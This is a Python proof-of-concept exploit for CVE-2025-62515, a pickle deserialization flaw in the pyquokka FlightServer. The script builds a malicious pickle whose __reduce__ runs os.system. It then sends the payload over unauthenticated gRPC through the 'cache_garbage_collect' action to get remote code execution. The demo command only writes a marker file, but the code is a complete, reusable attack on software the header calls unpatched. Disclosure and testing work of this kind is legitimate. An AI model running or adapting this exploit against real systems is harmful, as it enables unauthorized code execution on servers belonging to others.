#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : pyquokka FlightServer — Pickle Deserialization RCE (cache_garbage_collect)
# CVE            : CVE-2025-62515
# Vendor         : marsupialtail (pyquokka)
# Product        : pyquokka FlightServer
# Affected       : All versions through 0.3.2 (UNPATCHED)
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 9.8 (CRITICAL)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-62515 — Vector 2: cache_garbage_collect Action RCE

Demonstrates the SAME pickle.loads() RCE vulnerability through a DIFFERENT
action handler: "cache_garbage_collect" (flight.py line 305).

ATTACK CHAIN:
  1. Connect to FlightServer on gRPC port 5005 (no auth required)
  2. Send do_action("cache_garbage_collect", <malicious_pickle_payload>)
  3. Server calls pickle.loads(action.body.to_pybytes()) at line 305
  4. pickle __reduce__() triggers os.system() — RCE achieved

PREREQUISITES:
  - pyarrow (client-side only): pip install pyarrow

REFERENCES:
  - CVE-2025-62515
  - https://github.com/marsupialtail/quokka/security/advisories/GHSA-f74j-gffq-vm9p
"""

import sys
import pickle
import os

import pyarrow.flight


class RCEPayload:
    """Malicious pickle class — executes OS command via __reduce__ during deserialization."""
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        return (os.system, (self.command,))


def exploit(target_host, target_port=5005):
    """
    Exploit CVE-2025-62515 via the cache_garbage_collect action handler.

    This is a SECONDARY vector. The do_action() method also calls:
        pickle.loads(action.body.to_pybytes())
    for the "cache_garbage_collect" action type (line 305).
    """

    target_uri = f"grpc://{target_host}:{target_port}"
    marker_file = "/tmp/cve-2025-62515-vector2"

    print(f"[*] CVE-2025-62515 PoC — Vector 2: cache_garbage_collect action")
    print(f"[*] Target: {target_uri}")
    print()

    # Step 1: Connect to the Flight server
    print(f"[+] Connecting to FlightServer at {target_uri}...")
    try:
        client = pyarrow.flight.connect(target_uri)
        actions = list(client.list_actions())
        action_names = [a.type for a in actions]
        print(f"[+] Connected! Available actions: {action_names}")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)

    if "cache_garbage_collect" not in action_names:
        print("[-] 'cache_garbage_collect' action not found")
        sys.exit(1)
    print(f"[+] Target action 'cache_garbage_collect' is available")

    # Step 2: Craft RCE payload targeting this vector
    rce_command = (
        f"echo 'Vector: cache_garbage_collect (line 305)' > {marker_file} && "
        f"id >> {marker_file} && "
        f"echo 'CVE-2025-62515 RCE via cache_garbage_collect' >> {marker_file}"
    )

    payload = RCEPayload(rce_command)
    malicious_bytes = pickle.dumps(payload)

    print(f"[+] Crafted malicious pickle payload ({len(malicious_bytes)} bytes)")
    print()

    # Step 3: Send via cache_garbage_collect action
    # After deserialization, the server tries to iterate the result as a list
    # of tuples and delete them from self.flights. os.system() returns an int,
    # so iterating it will fail — but RCE has already fired.
    print(f"[+] Sending malicious 'cache_garbage_collect' action...")

    action = pyarrow.flight.Action("cache_garbage_collect", malicious_bytes)

    try:
        results = list(client.do_action(action))
        print(f"[+] Server returned results (unexpected)")
    except pyarrow.flight.FlightServerError as e:
        # Expected: server tries to iterate int as tuple list, fails
        print(f"[+] Server returned error (EXPECTED — RCE already executed):")
        error_msg = str(e)
        if len(error_msg) > 200:
            error_msg = error_msg[:200] + "..."
        print(f"    {error_msg}")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)

    print()
    print(f"[*] Exploit delivered via cache_garbage_collect vector.")
    print(f"[*] Verify: docker exec <container> cat {marker_file}")

    return marker_file


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5005

    exploit(target, port)
